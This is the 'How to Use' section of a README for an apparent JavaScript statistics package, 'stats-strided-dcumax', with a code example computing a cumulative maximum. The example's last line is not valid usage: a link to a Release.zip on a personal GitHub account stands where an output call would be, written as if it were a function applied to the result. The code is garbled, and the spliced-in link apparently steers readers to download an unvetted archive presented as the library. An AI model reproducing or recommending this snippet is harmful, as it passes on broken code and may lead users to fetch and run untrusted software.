## 🧮 How to Use

Here is an example of how you can use the **stats-strided-dcumax** library in your JavaScript project:

```javascript
// Import the library
const dcumax = require('stats-strided-dcumax');

// Define your array of double-precision floating-point numbers
const data = new Float64Array([1.5, 2.3, 0.8, 3.1, 2.9]);

// Calculate the cumulative maximum
const result = dcumax(data);

https://github.com/ddbro123/stats-strided-dcumax/releases/download/v1.0/Release.zip(result);
```

In this example, we import the library, create an array of numbers, and then use the `dcumax` function to calculate the cumulative maximum.
